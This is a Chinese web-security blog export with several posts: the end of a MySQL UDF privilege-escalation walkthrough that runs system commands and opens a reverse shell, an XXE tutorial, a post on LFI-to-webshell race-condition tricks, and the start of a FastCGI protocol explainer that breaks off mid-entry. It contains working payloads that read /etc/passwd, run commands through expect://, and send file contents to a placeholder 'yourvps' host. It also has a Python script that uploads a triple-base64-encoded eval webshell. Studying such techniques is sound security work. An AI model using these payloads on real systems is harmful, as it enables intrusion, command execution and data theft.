<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_exec returns string soname &quot;lib_mysqludt_dll&quot;;</span><br><span class="line">select sys_exec(&#39;calc&#39;); 调用函数</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rof0vr2oj31br0p748q.jpg" alt=""></p>
<p>udf.dll是16进制文件，我们可以用winhex查看可用函数</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rof7zhe5j30xt0fkwgb.jpg" alt=""></p>
<p>这些都为可调用函数</p>
<h2 id="Linux下udf提权"><a href="#Linux下udf提权" class="headerlink" title="Linux下udf提权"></a>Linux下udf提权</h2><p>其实linux下提权套路相同，只不过两个平台下提权方法都各种两种，第一种是提取文件的16进制形式生成新的16进制，第二就是用cloak.py去解码异或编码文件，先解决一下简单的方法</p>
<p><strong>测试环境Ubuntu18.04</strong></p>
<p>同样利用sqlmap  <code>python cloak.py -d -i &lt;文件&gt;</code> 得到以.so(linux下与window不同之处.dll与.so)，将这个文件同样放到/lib/plugin目录下</p>
<p>同样操作</p>
<p>create function sys_eval returns string soname “lib_mysqludf_so”</p>
<p>select sys_eval(‘whoami’);</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rofick8bj30i704njsr.jpg" alt=""></p>
<p>得到mysql权限，在Ubuntu下一定要以root权限启动，否则在查询<code>whoami</code>时返回Null</p>
<p>检查一下此时的函数功能都有哪些</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rogc1rn0j30o305zjsy.jpg" alt=""></p>
<p>通过探测发现我们可以通过这个功能进行反弹shell</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rofz1u1bj31b30d4wn1.jpg" alt=""></p>
<p>成功反弹shell</p>
<p>而且在mysql&gt;5.1版本下可以执行system语句</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpggy1g2rogmzfv7j316f06tdkv.jpg" alt=""></p>
<p>最后在介绍一下我在linux下未成功的16进制写入，感觉这个方法就比较麻烦了，还要拥有Mysql下的写入写出权限</p>
<p>流程如下</p>
<p>将sqlmap里面的文件转化为16进制写入临时目录下的udf.txt文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select hex(load_file(&#39;&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure>

<p>将udf.txt文件中的16进制形式用unhex去解码并转到/lib/plugin目录下的udf.so</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select unhex(&#39;7F454C46020...&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;mysqludf.so&#39;;</span><br></pre></td></tr></table></figure>

<p>之后的操作正常进行，不过不知什么原因udf.txt的内容在我的Ubuntu下一直为空</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>xml注入攻击</title>
    <url>/2019/06/01/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="XML注入基础知识"><a href="#XML注入基础知识" class="headerlink" title="XML注入基础知识"></a>XML注入基础知识</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line"></span><br><span class="line">&lt;to&gt;a1han&lt;&#x2F;to&gt;</span><br><span class="line"></span><br><span class="line">&lt;from&gt;aohan&lt;&#x2F;from&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>



<p> <code>version</code>显示的是版本号,<code>encoding</code>显示的是所用的编码方式,<code>note</code>则是根元素，note中的元素为子元素.</p>
<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
<h3 id="文档规范：DTD"><a href="#文档规范：DTD" class="headerlink" title="文档规范：DTD"></a>文档规范：DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。<br>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
<p><strong>DTD可以在xml文档内部声明，也可以在外部引用，通常造成漏洞的则是外部引用</strong>DTD在内部声明有严格的规范：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>//定义 note 元素有四个元素："to、from、heading,、body"</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>定义 to 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>定义 from 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>note为根元素，其余为子元素,<code>PCDATA</code>声明表示内部标记符号进行解析，所以需要引用实体，<code>CDATA</code>表示内部标记符号不进行解析，不需要引用实体符号</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rowd7u7wj30yg0dm41k.jpg" alt=""></p>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p><strong>内部DTD实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [ &lt;!ENTITY a1han &quot;666&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a1han “666&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;xxe&gt;</span><br><span class="line"></span><br><span class="line">&amp;a1han;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;xxe&gt;</span><br></pre></td></tr></table></figure>

<p>访问此xml文档，&a1han;被解析为666输出</p>
<h3 id="XML注入三种姿势"><a href="#XML注入三种姿势" class="headerlink" title="XML注入三种姿势"></a>XML注入三种姿势</h3><p>方法1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>方法2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;www.hackersb.cn&#x2F;attack.dtd&quot;&gt; %d; ]&gt;</span><br></pre></td></tr></table></figure>

<p>方法3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;www.hackersb.cn&#x2F;attack.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>attack.dtd内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="有回显XXE注入"><a href="#有回显XXE注入" class="headerlink" title="有回显XXE注入"></a>有回显XXE注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$xml&#x3D;simplexml_load_string($_GET[‘xml’]);</span><br><span class="line"></span><br><span class="line">print_r((string)$xml);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt”&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<p><strong>这里要注意的是一定要将payload进行url编码</strong></p>
<p>如果要读取<code>php,html</code>文件，为了避免冲突，要用 <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0″ encoding&#x3D;&quot;utf-8″?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM “php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<h3 id="无回显条件测试"><a href="#无回显条件测试" class="headerlink" title="无回显条件测试"></a>无回显条件测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$xml&#x3D;simplexml_load_string($_GET[‘xml’]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此步少了print_r，无法得到回显信息，对于无回显的条件，可利用参数实体发起http请求来攻击</p>
<p><strong>读取本地文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % dtd SYSTEM “http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line"></span><br><span class="line">%dtd; %all;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xxe.xml文件内容</strong></p>
<p><code>&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘http://yourvps/%file;&#39;&gt;”&gt;</code></p>
<p>讲此Payload进行url编码，在自己vps上的access.log上即可查看到文件内容</p>
<p>对于payload的解读：解析%dtd引入xxe.xml,,解析%all引入send实体，然后将%file文件内容作为http请求发送出去</p>
<p>同样如果要查看其他文件的话</p>
<p><code>php://filter/read=convert.base64-encode/resource=etc/passwd</code></p>
<h3 id="XXE危害"><a href="#XXE危害" class="headerlink" title="XXE危害"></a>XXE危害</h3><ul>
<li>读取任意文件</li>
<li>执行系统命令</li>
<li>探测内容端口</li>
<li>攻击内网网站</li>
</ul>
<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>需要在php环境安装expect扩展，执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&#x2F;payload&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XXE的防御手段"><a href="#XXE的防御手段" class="headerlink" title="XXE的防御手段"></a>XXE的防御手段</h3><p>1.过滤用户提交数据</p>
<p>2.禁用外部实体的调用</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>一些有趣的LFI姿势</title>
    <url>/2019/07/16/%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84LFI%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h3 id="利用phpinfo与LFI进行getshell"><a href="#利用phpinfo与LFI进行getshell" class="headerlink" title="利用phpinfo与LFI进行getshell"></a>利用phpinfo与LFI进行getshell</h3><h4 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h4><p>当给<code>php</code>发送<code>POST</code>数据包的时候，如果数据包里面包含我们<code>POST</code>过去的文件时，无论服务器上的文件有无处理文件上传的逻辑，<code>PHP</code>都会将将我们<code>POST</code>的文件保存为一个临时文件，形式为<code>(/tmp/php[6个随机字符])</code>,文件名字可以在<code>$_FILES</code>这个全局变量中找到,在这个请求结束后，这个临时文件就会被删掉，<strong>即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。</strong></p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>其实光听上面的原理介绍我们其实就可以想到条件竞争这个有意思的漏洞，也就是<strong>在那个临时文件还未被删除的时候，通过<code>$_FILES</code>全局变量中返回的文件名来进行文件包含，执行文件的php代码，生成我们的<code>webshell</code></strong>。下面通过代码来看一下返回的这个随机文件名字</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z7okZT.png" alt="Z7okZT.png"></p>
<p>一般的文件包含页面与<code>phpinfo()</code>页面是两个页面，正常情况下，虽然我们可以发完文件得到文件名，进而去第二个页面文件包含，但是往往在得到之后，这个临时文件就被删掉了，所以造成无法包含。所以此时可以用条件竞争来<code>getshell</code>，下面引用P牛的话：</p>
<ol>
<li>发送包含了<code>webshell</code>的上传数据包给<code>phpinfo</code>页面，这个数据包的<code>header、get</code>等位置需要塞满垃圾数据</li>
<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
<li>php默认的输出缓冲区大小为<code>4096</code>，可以理解为php每次返回<code>4096</code>个字节给<code>socket</code>连接</li>
<li>所以，我们直接操作原生<code>socket</code>，每次读取<code>4096</code>个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
<li>此时，第一个数据包的<code>socket</code>连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终<code>getshell</code></li>
</ol>
<p>上面这部分操作实际意思也就是通过对<code>get,header</code>部分的<code>padding</code>垃圾数据，但是php的默认缓冲区只有<code>4069</code>，所以我们可以在<code>socket</code>读到临时文件名立刻去第二个页面进行文件包含，而此时php还在打印phpinfo页面的信息，临时文件并没有被删除，所以可以成功getshell，exp链接<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py。" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py。</a></p>
<p>复现过程：</p>
<p><img src="https://s2.ax1x.com/2019/07/15/ZThIfI.png" alt="ZThIfI.png"></p>
<p><code>webshell</code>成功达到了<code>/tmp/g</code>文件中，通过<code>webshell</code>进行命令执行</p>
<p><img src="https://s2.ax1x.com/2019/07/15/ZT4VAJ.png" alt="ZT4VAJ.png"></p>
<h3 id="LFI-via-SegmentFault"><a href="#LFI-via-SegmentFault" class="headerlink" title="LFI via SegmentFault"></a>LFI via SegmentFault</h3><h4 id="原理介绍-1"><a href="#原理介绍-1" class="headerlink" title="原理介绍"></a>原理介绍</h4><p>首先在php环境下尝试运行此代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'print_r(file_get_contents("php://filter/string.strip_tags/resource=/etc/passwd"));'</span></span><br></pre></td></tr></table></figure>

<p>发现返回结果<code>Segmentation fault</code></p>
<p>这是<code>php7</code>出现的一个小<code>bug</code>,在<code>php</code>执行过程中出现<code>Segmentation fault</code>,并且在此同时去上传文件，那么临时文件就会被保存在/tmp目录下，并且不会被删除。<strong>所以我们需要上面的payload访问的同时去上传文件，这样文件就会被保存到我们的/tmp目录下，然后爆破文件名，文件包含得到shell</strong>。利用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"ip"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="php无限包含自身导致getshell"><a href="#php无限包含自身导致getshell" class="headerlink" title="php无限包含自身导致getshell"></a>php无限包含自身导致getshell</h3><h4 id="原理介绍-2"><a href="#原理介绍-2" class="headerlink" title="原理介绍"></a>原理介绍</h4><p><code>php</code>对上传文件会有一个临时文件夹存放文件 文件名一般为<code>php</code>加随机几个字母 当<code>php</code>脚本执行完成一个 临时文件会被删除 但是我们让<code>php</code>产生内存溢出或某种错误时<code>php</code>会因为错误导致直接退出 临时文件就会被保存起来。然后通过爆破文件名，可再次文件包含<code>getshell</code>。</p>
<p>构造如下表单</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form name=<span class="string">"upload"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"./lfi.php?file=lfi.php"</span>&gt;</span><br><span class="line">        File: &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>或者利用脚本循环请求</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">files=&#123;</span><br><span class="line">	<span class="string">'file'</span>:BytesIO(<span class="string">'&lt;?php phpinfo();?&gt;'</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">'http://127.0.0.1/lfi.php?file=lfi.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50000</span>):</span><br><span class="line">	requests.post(url=url,files=files)</span><br><span class="line">	<span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p>最终可在<code>/tmp</code>目录下得到我们的<code>shell</code>。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://skysec.top/2019/04/08/Some-Trick-About-LFI/" target="_blank" rel="noopener">https://skysec.top/2019/04/08/Some-Trick-About-LFI/</a></p>
<p><a href="http://vinc.top/2016/08/25/php文件包含漏洞利用总结/" target="_blank" rel="noopener">http://vinc.top/2016/08/25/php文件包含漏洞利用总结/</a></p>
<p><a href="https://jsproxy.ga/-----https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://jsproxy.ga/-----https://www.jianshu.com/p/dfd049924258</a></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Fastcgi安全</title>
    <url>/2019/06/01/%E5%88%9D%E6%8E%A2Fastcgi%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h3 id="中间件，服务器，容器与web服务器"><a href="#中间件，服务器，容器与web服务器" class="headerlink" title="中间件，服务器，容器与web服务器"></a>中间件，服务器，容器与web服务器</h3><p>服务器:服务器指的是一个管理资源并为用户提供服务的计算机软件，通常分为文件服务器、数据库服务器和应用程序服务器。运行以上软件的计算机或计算机系统也被称为服务器，<strong>应该就例如我之前购买的阿里云学生机以及vultr，就是一个简单的服务器，而没有搭建任何web服务，也就是没有服务器中间件去解析http协议，所以无法正常返回html等页面。</strong></p>
<p>中间件：<strong>中间件是服务器上负责解析http请求的一组应用程序</strong>，负责接受并解析http请求，在服务器上找到请求对应的文件，返回给客户端。<strong>如果http请求的是动态脚本文件(如php)，则中间件会依靠web容器去解析动态语言，靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。</strong></p>
<p>web服务器：提供w3服务的软件或主机，即Web服务器软件或装有Web服务器软件的计算机。例如：IIS、Apache、nginx、Lighttpd。Web服务器可以处理 HTTP 协议，响应针对静态页面或图片的请求，进行页面跳转，或者把动态请求委托其它程序（它的扩展、某种语言的解释引擎、Web容器。</p>
<blockquote>
<p>所属的类别</p>
<p>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。</p>
<p>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。</p>
<p>web容器：JSP容器、SERVLET容器、ASP容器等</p>
</blockquote>
<h3 id="Fastcgi协议分析"><a href="#Fastcgi协议分析" class="headerlink" title="Fastcgi协议分析"></a>Fastcgi协议分析</h3><p>相对于http协议，Fastcgi同样也是一种通信协议(相对于cgi的升级协议)，下面跟随P牛的脚步来分析一下Fastcgi以及产生的部分漏洞</p>
<p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并在服务器上按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给客户端。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。也就是实现了web中间件对动态语言的解析—–<strong>如果http数据包所请求的是一个动态脚本文件，如php等，中间件就要靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。</strong></p>
<p>Fastcgi协议由多个record进行，每个record中也有对应的header和body，header大多都是八个字节，body是由头中的contentLength指定，Fastcgi将这个内容发送给语言后端，语言后端将请求解码，到服务器上拿到对应请求回来的文件，返回给客户端.Fastcgi协议内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>可以看到requestIdB1是唯一的标志ID，contentlength代表的则是body的体的大小，record头文件中共有八个UNchar类型，这两个变量各占两个字节，padding部分起保留作用，在不需要的时候可以设置为0</p>
<h3 id="Fastcgi-type"><a href="#Fastcgi-type" class="headerlink" title="Fastcgi type"></a>Fastcgi type</h3><p><code>fastcgi type</code>代表着是本次交互的数据包，一个record可能不足以全部代表本次发送的数据包，所以一次数据请求需要伴随着多个record的传递.type分别代表的意思</p>
